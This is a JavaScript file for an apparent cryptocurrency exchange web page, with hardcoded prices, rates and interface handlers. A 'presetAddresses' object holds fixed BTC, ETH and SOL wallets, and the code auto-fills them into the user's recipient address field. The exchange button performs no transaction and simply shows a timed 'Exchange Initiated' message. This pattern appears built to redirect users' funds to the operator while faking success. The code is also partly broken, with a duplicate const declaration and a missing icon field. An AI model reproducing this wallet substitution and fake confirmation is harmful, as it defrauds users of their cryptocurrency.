// Crypto data with emoji symbols
const cryptoData = {
    BTC: { name: 'Bitcoin', price: 95000, emoji: '₿' },
    ETH: { name: 'Ethereum', price: 3070, emoji: 'Ξ' },
    SOL: { name: 'Solana', price: 175, emoji: '◎' },
    USDT: { name: 'Tether', price: 1, emoji: '₮' },
    USDC: { name: 'USD Coin', price: 1, emoji: '$' },
    LTC: { name: 'Litecoin', price: 105, emoji: 'Ł' }
};

// Exchange rates (simplified - in real app would fetch from API)
const exchangeRates = {
    BTC: { ETH: 30.78897, SOL: 542.86, USDT: 95000, USDC: 95000, LTC: 904.76 },
    ETH: { BTC: 0.0325, SOL: 17.54, USDT: 3070, USDC: 3070, LTC: 29.24 },
    SOL: { BTC: 0.00184, ETH: 0.057, USDT: 175, USDC: 175, LTC: 1.67 },
    USDT: { BTC: 0.0000105, ETH: 0.000326, SOL: 0.00571, USDC: 1, LTC: 0.00952 },
    USDC: { BTC: 0.0000105, ETH: 0.000326, SOL: 0.00571, USDT: 1, LTC: 0.00952 },
    LTC: { BTC: 0.00111, ETH: 0.0342, SOL: 0.6, USDT: 105, USDC: 105 }
};

// Current selected cryptos
let sendCrypto = 'BTC';
let getCrypto = 'ETH';

// Preset wallet addresses
const presetAddresses = {
    SOL: '7cXAmVBEVJcwPCj37zakcfc7xinfn459spkvgHKHrEeY',
    ETH: '0x4EBe6598680D12FC5f40C3D68238f8D4d51f7877',
    BTC: 'bc1qkvzrkcvn67zj5xaxa4klwdr0gc69dddp2786g7',
    USDT: '0x4EBe6598680D12FC5f40C3D68238f8D4d51f7877', // Same as ETH (ERC-20)
    USDC: '0x4EBe6598680D12FC5f40C3D68238f8D4d51f7877', // Same as ETH (ERC-20)
    LTC: '' // No preset for LTC
};

// Get DOM elements
const sendUSDInput = document.getElementById('sendUSD');
const getUSDInput = document.getElementById('getUSD');
const sendCryptoElement = document.getElementById('sendCrypto');
const getCryptoElement = document.getElementById('getCrypto');
const refreshBtn = document.querySelector('.refresh-btn');
const acceptBtn = document.querySelector('.accept-btn');
const cookieNotice = document.querySelector('.cookie-notice');
const tabs = document.querySelectorAll('.tab');
const exchangeBtn = document.querySelector('.exchange-btn');
const btnAmount = document.querySelector('.btn-amount');

// Format numbers
function formatNumber(amount, decimals = 2) {
    return amount.toFixed(decimals).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
}

// Calculate exchange from USD input
function calculateExchange() {
    const sendUSD = parseFloat(sendUSDInput.value) || 0;
    
    // Calculate crypto amounts
    const sendAmount = sendUSD / cryptoData[sendCrypto].price;
    const exchangeRate = exchangeRates[sendCrypto][getCrypto] || 0;
    const getAmount = sendAmount * exchangeRate;
    const getUSD = getAmount * cryptoData[getCrypto].price;
    
    // Update crypto displays
    sendCryptoElement.textContent = sendAmount.toFixed(8);
    getCryptoElement.textContent = getAmount.toFixed(8);
    
    // Update receive USD
    getUSDInput.value = formatNumber(getUSD);
    
    // Update button amount
    btnAmount.textContent = `$${formatNumber(sendUSD)} → $${formatNumber(getUSD)}`;
    
    // Update exchange rate display
    const rateDisplay = document.querySelector('.exchange-rate span');
    rateDisplay.textContent = `Estimated rate: 1 ${sendCrypto} ≈ ${exchangeRate.toFixed(5)} ${getCrypto}`;
}

// Event listeners
sendUSDInput.addEventListener('input', calculateExchange);

// Refresh rate animation
refreshBtn.addEventListener('click', function() {
    this.style.transform = 'rotate(360deg)';
    setTimeout(() => {
        this.style.transform = 'rotate(0deg)';
    }, 500);
});

// Cookie notice
acceptBtn.addEventListener('click', function() {
    cookieNotice.style.display = 'none';
});

// Tab switching
tabs.forEach(tab => {
    tab.addEventListener('click', function() {
        tabs.forEach(t => t.classList.remove('active'));
        this.classList.add('active');
    });
});

// Currency selector dropdowns
const currencySelectors = document.querySelectorAll('.currency-selector');
currencySelectors.forEach(selector => {
    selector.addEventListener('click', function() {
        // In a real app, this would open a currency selection modal
        console.log('Currency selector clicked');
    });
});

// Exchange button and address handling
const exchangeBtn = document.getElementById('exchangeBtn');
const recipientAddress = document.getElementById('recipientAddress');
const pasteBtn = document.getElementById('pasteBtn');

// Update placeholder and preset address when crypto changes
function updateAddressPlaceholder() {
    recipientAddress.placeholder = `Enter ${getCrypto} wallet address`;
    
    // Auto-fill with preset address if available
    if (presetAddresses[getCrypto]) {
        recipientAddress.value = presetAddresses[getCrypto];
    } else {
        recipientAddress.value = '';
    }
}

// Paste button functionality
pasteBtn.addEventListener('click', async function() {
    try {
        const text = await navigator.clipboard.readText();
        recipientAddress.value = text;
    } catch (err) {
        console.error('Failed to read clipboard');
    }
});

// Exchange button click handler
exchangeBtn.addEventListener('click', function() {
    const address = recipientAddress.value.trim();
    
    if (!address) {
        alert('Please enter a recipient wallet address');
        recipientAddress.focus();
        return;
    }
    
    // Basic address validation (simplified)
    const addressValidation = {
        ETH: /^0x[a-fA-F0-9]{40}$/,
        BTC: /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$/,
        SOL: /^[1-9A-HJ-NP-Za-km-z]{32,44}$/,
        USDT: /^0x[a-fA-F0-9]{40}$/,
        USDC: /^0x[a-fA-F0-9]{40}$/,
        LTC: /^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$/
    };
    
    if (addressValidation[getCrypto] && !addressValidation[getCrypto].test(address)) {
        alert(`Invalid ${getCrypto} address format`);
        return;
    }
    
    // Show processing state
    this.disabled = true;
    this.innerHTML = `
        <span class="btn-text">Processing...</span>
        <span class="btn-amount">Please wait</span>
    `;
    
    // Simulate processing (in real app, this would be an API call)
    setTimeout(() => {
        // Show success message
        this.innerHTML = `
            <span class="btn-text">✓ Exchange Initiated</span>
            <span class="btn-amount">Check your wallet</span>
        `;
        this.style.background = 'linear-gradient(135deg, #00d4aa 0%, #00b894 100%)';
        
        // Reset after 3 seconds
        setTimeout(() => {
            this.disabled = false;
            this.innerHTML = `
                <span class="btn-text">Exchange</span>
                <span class="btn-amount">${btnAmount.textContent}</span>
            `;
            this.style.background = '';
            recipientAddress.value = '';
        }, 3000);
    }, 2000);
});

// Payment options
const paymentOptions = document.querySelectorAll('.payment-option');
paymentOptions.forEach(option => {
    option.addEventListener('click', function() {
        // In a real app, this would open payment method
        console.log('Payment option selected');
    });
});

// Add smooth transitions
refreshBtn.style.transition = 'transform 0.5s ease';

// Risk modal elements
const riskInfoBtn = document.getElementById('riskInfoBtn');
const riskModal = document.getElementById('riskModal');
const closeModal = document.getElementById('closeModal');
const understandBtn = document.getElementById('understandBtn');

// Show risk modal
riskInfoBtn.addEventListener('click', function() {
    riskModal.style.display = 'block';
    document.body.style.overflow = 'hidden';
});

// Close modal functions
function closeRiskModal() {
    riskModal.style.display = 'none';
    document.body.style.overflow = 'auto';
}

closeModal.addEventListener('click', closeRiskModal);
understandBtn.addEventListener('click', closeRiskModal);

// Close modal when clicking outside
riskModal.addEventListener('click', function(e) {
    if (e.target === riskModal) {
        closeRiskModal();
    }
});

// Crypto selection
const cryptoModal = document.getElementById('cryptoModal');
const closeCryptoModal = document.getElementById('closeCryptoModal');
const sendCryptoDisplay = document.getElementById('sendCryptoDisplay');
const getCryptoDisplay = document.getElementById('getCryptoDisplay');
let currentSelectionType = 'send'; // 'send' or 'get'

// Open crypto selector
sendCryptoDisplay.addEventListener('click', function() {
    currentSelectionType = 'send';
    cryptoModal.style.display = 'block';
    document.body.style.overflow = 'hidden';
});

getCryptoDisplay.addEventListener('click', function() {
    currentSelectionType = 'get';
    cryptoModal.style.display = 'block';
    document.body.style.overflow = 'hidden';
});

// Close crypto modal
function closeCryptoModalFunc() {
    cryptoModal.style.display = 'none';
    document.body.style.overflow = 'auto';
}

closeCryptoModal.addEventListener('click', closeCryptoModalFunc);
cryptoModal.addEventListener('click', function(e) {
    if (e.target === cryptoModal) closeCryptoModalFunc();
});

// Select crypto
document.querySelectorAll('.crypto-item').forEach(item => {
    item.addEventListener('click', function() {
        const selectedCrypto = this.dataset.crypto;
        const selectedPrice = this.dataset.price;
        
        if (currentSelectionType === 'send') {
            sendCrypto = selectedCrypto;
            document.getElementById('sendCryptoCode').textContent = selectedCrypto;
            document.getElementById('sendCryptoIcon').src = cryptoData[selectedCrypto].icon;
        } else {
            getCrypto = selectedCrypto;
            document.getElementById('getCryptoCode').textContent = selectedCrypto;
            document.getElementById('getCryptoIcon').src = cryptoData[selectedCrypto].icon;
            updateAddressPlaceholder();
        }
        
        closeCryptoModalFunc();
        calculateExchange();
    });
});

// Search functionality
const cryptoSearch = document.getElementById('cryptoSearch');
cryptoSearch.addEventListener('input', function() {
    const searchTerm = this.value.toLowerCase();
    document.querySelectorAll('.crypto-item').forEach(item => {
        const cryptoName = item.querySelector('.crypto-name').textContent.toLowerCase();
        const cryptoSymbol = item.querySelector('.crypto-symbol').textContent.toLowerCase();
        
        if (cryptoName.includes(searchTerm) || cryptoSymbol.includes(searchTerm)) {
            item.style.display = 'flex';
        } else {
            item.style.display = 'none';
        }
    });
});

// Initialize
calculateExchange();
updateAddressPlaceholder();